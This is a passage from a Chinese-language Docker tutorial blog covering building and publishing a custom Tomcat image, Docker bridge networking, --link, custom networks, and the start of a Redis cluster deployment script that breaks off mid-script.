/usr/local/apache-tomcat-9.0.35/logs/catalina.out # 设置默认命令</span><br></pre></td></tr></table></figure><h5 id="3、构建镜像"><a href="#3、构建镜像" class="headerlink" title="3、构建镜像"></a>3、构建镜像</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 因为dockerfile命名使用默认命名 因此不用使用-f 指定文件</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker build -t mytomcat:0.1 .</span></span><br></pre></td></tr></table></figure><h5 id="4、run镜像"><a href="#4、run镜像" class="headerlink" title="4、run镜像"></a>4、run镜像</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> -d:后台运行 -p:暴露端口 --name:别名 -v:绑定路径 </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -p 8080:8080 --name tomcat01 </span></span><br><span class="line">-v /home/kuangshen/build/tomcat/test:/usr/local/apache-tomcat-9.0.35/webapps/test </span><br><span class="line">-v /home/kuangshen/build/tomcat/tomcatlogs/:/usr/local/apache-tomcat-9.0.35/logs mytomcat:0.1</span><br></pre></td></tr></table></figure><h5 id="5、访问测试"><a href="#5、访问测试" class="headerlink" title="5、访问测试"></a>5、访问测试</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">exec</span> -it 自定义容器的id /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cul localhost:8080</span></span><br></pre></td></tr></table></figure><h5 id="6、发布项目"><a href="#6、发布项目" class="headerlink" title="6、发布项目"></a>6、发布项目</h5><p>(由于做了卷挂载，我们直接在本地编写项目就可以发布了！)</p><p>发现：项目部署成功，可以直接访问！</p><p>我们以后开发的步骤：需要掌握Dockerfile的编写！我们之后的一切都是使用docker镜像来发布运行！</p><h2 id="发布自己的镜像"><a href="#发布自己的镜像" class="headerlink" title="发布自己的镜像"></a>发布自己的镜像</h2><blockquote><p>发布到 Docker Hub</p></blockquote><p>1、地址 <a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a></p><p>2、确定这个账号可以登录</p><p>3、登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker login --<span class="built_in">help</span></span></span><br><span class="line">Usage:  docker login [OPTIONS] [SERVER]</span><br><span class="line"></span><br><span class="line">Log in to a Docker registry.</span><br><span class="line">If no server is specified, the default is defined by the daemon.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -p, --password string   Password</span><br><span class="line">      --password-stdin    Take the password from stdin</span><br><span class="line">  -u, --username string   Username</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker login -u 你的用户名 -p 你的密码</span></span><br></pre></td></tr></table></figure><p>4、提交 push镜像</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE2NDQzNDA0Mi5wbmc?x-oss-process=image/format,png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 会发现push不上去，因为如果没有前缀的话默认是push到 官方的library</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解决方法：</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 第一种 build的时候添加你的dockerhub用户名，然后在push就可以放到自己的仓库了</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker build -t kuangshen/mytomcat:0.1 .</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 第二种 使用docker tag <span class="comment">#然后再次push</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker tag 容器id kuangshen/mytomcat:1.0 <span class="comment">#然后再次push</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker push kuangshen/mytomcat:1.0</span></span><br></pre></td></tr></table></figure><h4 id="The-push-refers-to-a-repository-docker报错解决方案"><a href="#The-push-refers-to-a-repository-docker报错解决方案" class="headerlink" title="The push refers to a repository(docker报错解决方案)"></a>The push refers to a repository(docker报错解决方案)</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">解决方案：</span><br><span class="line"></span><br><span class="line">原因docker私有仓库服务器，默认是基于https传输的，所以我们需要在客户端127.0.0.1做相关设置，不使用https传输</span><br><span class="line"></span><br><span class="line">解决步骤：</span><br><span class="line">vi /etc/docker/daemon.json</span><br><span class="line">将下面的代码放进去保存并退出。</span><br><span class="line">"insecure-registries":["127.0.0.1:5000"]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">最终如下所示：</span><br><span class="line">&#123;</span><br><span class="line">        "registry-mirrors": ["https://njrds9qc.mirror.aliyuncs.com"],</span><br><span class="line">        "insecure-registries":["127.0.0.1:5000"]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">依次执行下面两条命令，重新启动docker：</span><br><span class="line">[root@localhost ~]# systemctl daemon-reload</span><br><span class="line">[root@localhost ~]# systemctl restart docker</span><br></pre></td></tr></table></figure><blockquote><p>发布到 阿里云镜像服务上</p></blockquote><p>看官网 很详细<a href="https://cr.console.aliyun.com/repository/" target="_blank" rel="noopener">https://cr.console.aliyun.com/repository/</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo docker login --username=zchengx registry.cn-shenzhen.aliyuncs.com</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo docker tag [ImageId] registry.cn-shenzhen.aliyuncs.com/dsadxzc/cheng:[镜像版本号]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改id 和 版本</span></span><br><span class="line">sudo docker tag a5ef1f32aaae registry.cn-shenzhen.aliyuncs.com/dsadxzc/cheng:1.0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改版本</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo docker push registry.cn-shenzhen.aliyuncs.com/dsadxzc/cheng:[镜像版本号]</span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE3MTE1NTY2Ny5wbmc?x-oss-process=image/format,png" alt="img"></p><h2 id="Docker-网络"><a href="#Docker-网络" class="headerlink" title="Docker 网络"></a>Docker 网络</h2><h5 id="理解Docker-0"><a href="#理解Docker-0" class="headerlink" title="理解Docker 0"></a>理解Docker 0</h5><p>学习之前<strong>清空下前面的docker 镜像、容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 删除全部容器</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker rm -f $(docker ps -aq)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除全部镜像</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker rmi -f $(docker images -aq)</span></span><br></pre></td></tr></table></figure><blockquote><p>测试</p></blockquote><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNTIyMzIzNjc3Mi5wbmc?x-oss-process=image/format,png" alt="img"></p><p><strong>三个网络</strong></p><blockquote><p>问题： docker 是如果处理容器网络访问的？</p></blockquote><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE3MjA0MTk4NS5wbmc?x-oss-process=image/format,png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 测试  运行一个tomcat</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -P --name tomcat01 tomcat</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看容器内部网络地址</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">exec</span> -it 容器id ip addr</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 发现容器启动的时候会得到一个 eth0@if91 ip地址，docker分配！</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ip addr</span></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">261: eth0@if91: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line"><span class="meta">#</span><span class="bash"> 思考？ linux能不能ping通容器内部！ 可以 容器内部可以ping通外界吗？ 可以！</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ping 172.18.0.2</span></span><br><span class="line">PING 172.18.0.2 (172.18.0.2) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.069 ms</span><br><span class="line">64 bytes from 172.18.0.2: icmp_seq=2 ttl=64 time=0.074 ms</span><br></pre></td></tr></table></figure><blockquote><p>原理</p></blockquote><p>1、我们每启动一个docker容器，docker就会给docker容器分配一个ip，我们只要按照了docker，就会有一个docker0桥接模式，使用的技术是veth-pair技术！</p><p><a href="https://www.cnblogs.com/bakari/p/10613710.html" target="_blank" rel="noopener">https://www.cnblogs.com/bakari/p/10613710.html</a></p><p>再次测试 ip addr</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNTIyNDAzNjg4My5wbmc?x-oss-process=image/format,png" alt="img"></p><p>2 、再启动一个容器测试，发现又多了一对网络</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE3MzI1OTQ1OC5wbmc?x-oss-process=image/format,png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 我们发现这个容器带来网卡，都是一对对的</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> veth-pair 就是一对的虚拟设备接口，他们都是成对出现的，一端连着协议，一端彼此相连</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 正因为有这个特性 veth-pair 充当一个桥梁，连接各种虚拟网络设备的</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> OpenStac,Docker容器之间的连接，OVS的连接，都是使用evth-pair技术</span></span><br></pre></td></tr></table></figure><p>3、我们来测试下tomcat01和tomcat02是否可以ping通</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取tomcat01的ip 172.17.0.2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker-tomcat docker <span class="built_in">exec</span> -it tomcat01 ip addr  </span></span><br><span class="line">550: eth0@if551: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">       </span><br><span class="line"><span class="meta">#</span><span class="bash"> 让tomcat02 ping tomcat01       </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker-tomcat docker <span class="built_in">exec</span> -it tomcat02 ping 172.17.0.2</span></span><br><span class="line">PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.098 ms</span><br><span class="line">64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.071 ms</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 结论：容器和容器之间是可以互相ping通</span></span><br></pre></td></tr></table></figure><p><strong>网络模型图</strong></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE3NDI0ODYyNi5wbmc?x-oss-process=image/format,png" alt="img"></p><p>结论：tomcat01和tomcat02公用一个路由器，docker0。</p><p>所有的容器不指定网络的情况下，都是docker0路由的，docker会给我们的容器分配一个默认的可用ip。</p><blockquote><p>小结</p></blockquote><p>Docker使用的是Linux的桥接，宿主机是一个Docker容器的网桥 docker0</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE3NDcwMTA2My5wbmc?x-oss-process=image/format,png" alt="img"></p><p>Docker中所有网络接口都是虚拟的，虚拟的转发效率高（内网传递文件）</p><p>只要容器删除，对应的网桥一对就没了！</p><p><strong>思考一个场景：我们编写了一个微服务，database url=ip: 项目不重启，数据ip换了，我们希望可以处理这个问题，可以通过名字来进行访问容器</strong>？</p><h5 id="–-link"><a href="#–-link" class="headerlink" title="–-link"></a>–-link</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">exec</span> -it tomcat02 ping tomca01   <span class="comment"># ping不通</span></span></span><br><span class="line">ping: tomca01: Name or service not known</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行一个tomcat03 --link tomcat02 </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -P --name tomcat03 --link tomcat02 tomcat</span></span><br><span class="line">5f9331566980a9e92bc54681caaac14e9fc993f14ad13d98534026c08c0a9aef</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3连接2</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 用tomcat03 ping tomcat02 可以ping通</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">exec</span> -it tomcat03 ping tomcat02</span></span><br><span class="line">PING tomcat02 (172.17.0.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from tomcat02 (172.17.0.3): icmp_seq=1 ttl=64 time=0.115 ms</span><br><span class="line">64 bytes from tomcat02 (172.17.0.3): icmp_seq=2 ttl=64 time=0.080 ms</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2连接3</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 用tomcat02 ping tomcat03 ping不通</span></span><br></pre></td></tr></table></figure><p><strong>探究：</strong></p><p>docker network inspect 网络id 网段相同</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE3NTkwNDU1MS5wbmc?x-oss-process=image/format,png" alt="img"></p><p>docker inspect tomcat03</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE4MDMwODUzMC5wbmc?x-oss-process=image/format,png" alt="img"></p><p>查看tomcat03里面的/etc/hosts发现有tomcat02的配置</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE4MDYyOTAxMi5wbmc?x-oss-process=image/format,png" alt="img"></p><p>–link 本质就是在hosts配置中添加映射</p><p>现在使用Docker已经不建议使用–link了！</p><p>自定义网络，不适用docker0！</p><p>docker0问题：不支持容器名连接访问！</p><h5 id="自定义网络"><a href="#自定义网络" class="headerlink" title="==自定义网络=="></a>==自定义网络==</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker network</span><br><span class="line">connect     -- Connect a container to a network</span><br><span class="line">create      -- Creates a new network with a name specified by the</span><br><span class="line">disconnect  -- Disconnects a container from a network</span><br><span class="line">inspect     -- Displays detailed information on a network</span><br><span class="line">ls          -- Lists all the networks created by the user</span><br><span class="line">prune       -- Remove all unused networks</span><br><span class="line">rm          -- Deletes one or more networks</span><br></pre></td></tr></table></figure><blockquote><p>查看所有的docker网络</p></blockquote><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE5MDMxNjA3My5wbmc?x-oss-process=image/format,png" alt="img"></p><p><strong>网络模式</strong></p><p>bridge ：桥接 docker（默认，自己创建也是用bridge模式）</p><p>none ：不配置网络，一般不用</p><p>host ：和所主机共享网络</p><p>container ：容器网络连通（用得少！局限很大）</p><p>测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 我们直接启动的命令 --net bridge,而这个就是我们得docker0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> bridge就是docker0</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -P --name tomcat01 tomcat</span></span><br><span class="line">等价于 =&gt; docker run -d -P --name tomcat01 --net bridge tomcat</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker0，特点：默认，域名不能访问。 --link可以打通连接，但是很麻烦！</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 我们可以 自定义一个网络</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet</span></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE5MTEzOTk0NC5wbmc?x-oss-process=image/format,png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker network inspect mynet;</span></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE5MTQwNzA2NS5wbmc?x-oss-process=image/format,png" alt="img"></p><p>启动两个tomcat,再次查看网络情况</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE5MTg0NDI0MC5wbmc?x-oss-process=image/format,png" alt="img"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE5MjAwNzM3MS5wbmc?x-oss-process=image/format,png" alt="img"></p><p>在自定义的网络下，服务可以互相ping通，不用使用–link</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE5MjEzNDY3My5wbmc?x-oss-process=image/format,png" alt="img"></p><p>我们自定义的网络docker当我们维护好了对应的关系，推荐我们平时这样使用网络！</p><p>好处：</p><p>redis -不同的集群使用不同的网络，保证集群是安全和健康的</p><p>mysql-不同的集群使用不同的网络，保证集群是安全和健康的</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE5MjUwNDM2Ny5wbmc?x-oss-process=image/format,png" alt="img"></p><h2 id="网络连通"><a href="#网络连通" class="headerlink" title="网络连通"></a>网络连通</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE5MzI0MzE0Ni5wbmc?x-oss-process=image/format,png" alt="img"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE5MzI1OTE4NS5wbmc?x-oss-process=image/format,png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 测试两个不同的网络连通  再启动两个tomcat 使用默认网络，即docker0</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -P --name tomcat01 tomcat</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -P --name tomcat02 tomcat</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 此时ping不通</span></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE5MzU1NDkzMS5wbmc?x-oss-process=image/format,png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 要将tomcat01 连通 tomcat—net-01 ，连通就是将 tomcat01加到 mynet网络</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一个容器两个ip（tomcat01）</span></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE5Mzg0ODMzNy5wbmc?x-oss-process=image/format,png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 01连通 ，加入后此时，已经可以tomcat01 和 tomcat-01-net ping通了</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 02是依旧不通的</span></span><br></pre></td></tr></table></figure><p>结论：假设要跨网络操作别人，就需要使用docker network connect 连通！</p><h2 id="实战：部署Redis集群"><a href="#实战：部署Redis集群" class="headerlink" title="实战：部署Redis集群"></a>实战：部署Redis集群</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjE5NDQxOTQ3MS5wbmc?x-oss-process=image/format,png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建网卡</span></span><br><span class="line">docker network create redis --subnet 172.38.0.0/16</span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过脚本创建六个redis配置</span></span><br><span class="line">for port in $(seq 1 6);\</span><br><span class="line">do \</span><br><span class="line">mkdir -p /mydata/redis/node-$&#123;port&#125;/conf</span><br><span class="line">touch /mydata/redis/node-$&#123;port&#125;/conf/redis.conf</span><br><span class="line">cat &lt;&lt; EOF &gt;&gt; /mydata/redis/node-$&#123;port&#125;/conf/redis.conf</span><br><span class="line">port 6379</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file nodes.conf</span><br><span class="line">cluster-node-timeout 5000</span><br><span 